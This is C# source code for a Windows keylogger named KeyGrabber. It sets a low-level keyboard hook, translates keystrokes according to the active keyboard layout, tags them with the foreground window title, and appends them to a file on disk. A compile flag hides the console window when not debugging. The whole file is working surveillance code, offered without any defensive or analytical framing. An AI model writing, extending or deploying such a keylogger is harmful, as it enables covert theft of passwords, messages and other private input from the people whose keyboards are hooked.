#define DBG
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace KeyGrabber
{
    class BlockWindows
    {
        private struct KeyMessage
        {
            private string App { get; set; }

            public string Message { get; private set; }

            public void Write()
            {
                if (Message.Length > 0)
                {
                    var windowTitle = App;
                    using (var sw = new StreamWriter("D:\\test02.txt", true, UTF8Encoding.Default))
                    {
                        sw.Write('[' + windowTitle + ']' + DateTime.Now);
                        sw.Write("\r\n" + Message + "\r\n");
                        Message = "";
                    }
                }
            }

            public void SetAppTitle(string appTitle)
            {
                App = appTitle;
            }

            public void AddChar(char c)
            {
                Message += c;
            }

            public void AddString(string c)
            {
                Message += c;
            }
        }

        static KeyMessage _message = new KeyMessage();
        static IntPtr _keyBoardHook = IntPtr.Zero;
        static readonly Timer T = new Timer();
        public static void Main()
        {
            _keyBoardHook = SetKeyBoardHook();
            var ctx = new ApplicationContext();
            ctx.ThreadExit += (sender, e) => WinApi.UnhookWindowsHookEx(_keyBoardHook);
            var win = WinApi.FindWindow(null, GetForeWindowTitle());
            if (win != IntPtr.Zero)
            {
                #if !DBG
                    ShowWindow(win, 0);
                #endif
                #if DBG
                    WinApi.ShowWindow(win, 1);     
                #endif
            }
            T.Interval = 5000;
            T.Tick += (f, a) =>
            {
                _message.Write();
                T.Stop();
            };

            try
            {
                Application.Run(ctx);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private static IntPtr SetKeyBoardHook()
        {
            var curProcess = Process.GetCurrentProcess();
            var curModule = curProcess.MainModule;
            return WinApi.SetWindowsHookEx(
                WinApi.WH_KEYBOARD_LL,
                HookCallback,
                WinApi.GetModuleHandle(curModule.ModuleName),
                0);
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if ((wParam == (IntPtr) WinApi.WM_KEYDOWN))
                {
                    var code = Marshal.ReadInt32(lParam);
                    var key = (Keys) code;

                    if (IsDisalovedKey(key))
                    {
                        _message.AddString(" ");
                    }
                    else
                    {
                        var b = new StringBuilder(100);

                        var fore = WinApi.GetForegroundWindow();

                        var tpId = WinApi.GetWindowThreadProcessId(fore, IntPtr.Zero); //user for get keyboard layout
                        var hKl = WinApi.GetKeyboardLayout(tpId);
                        hKl = (IntPtr) (hKl.ToInt32() & 0x0000FFFF);

                        var keys = new byte[256]; //used for get keyboard state
                        WinApi.GetKeyboardState(keys);

                        if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift)
                            keys[16] = 0x80;
                        if ((Control.ModifierKeys & Keys.Control) == Keys.Control)
                            keys[17] = 0x80;
                        if (Control.IsKeyLocked(Keys.CapsLock))
                            keys[20] = 0x80;  

                        WinApi.ToUnicodeEx(
                            (uint) key,
                            (uint) key,
                            keys,
                            b,
                            100,
                            0,
                            hKl
                            );

                        _message.SetAppTitle(GetForeWindowTitle());
                        _message.AddChar(b[0]);
                        Console.WriteLine(_message.Message);
                        Console.WriteLine(WinApi.GetAsyncKeyState(key));
                        T.Stop();
                    }
                }

                if ((wParam == (IntPtr) WinApi.WM_KEYUP))
                {
                    T.Start();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return WinApi.CallNextHookEx(_keyBoardHook, nCode, wParam, lParam);
        }

        private static bool IsDisalovedKey(Keys key)
        {
            return new List<Keys>
            {
                Keys.Escape,
                Keys.Return,
                Keys.Up,
                Keys.Down,
                Keys.PageDown,
                Keys.PageUp,
                Keys.Tab,
                Keys.Right,
                Keys.Left,
                Keys.Home,
                Keys.Insert,
                Keys.End,
                Keys.Back,
                Keys.Delete,
                Keys.RMenu,
                Keys.LMenu,
                Keys.F1,
                Keys.F2,
                Keys.F3,
                Keys.F4,
                Keys.F5,
                Keys.F6,
                Keys.F7,
                Keys.F8,
                Keys.F9,
                Keys.F10,
                Keys.F11,
                Keys.F12,
                Keys.LShiftKey,
                Keys.RShiftKey,
                Keys.LControlKey,
                Keys.RControlKey,
                Keys.CapsLock
            }.Contains(key);
        }

        private static string GetForeWindowTitle()
        {
            var fore = WinApi.GetForegroundWindow();

            const int count = 512;
            var title = new StringBuilder(count);
            var t = WinApi.GetWindowText(fore, title, count);

            return (t > 0) ? title.ToString() : "";
        }

        public static void WinChangeProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
          
        }

    }
}
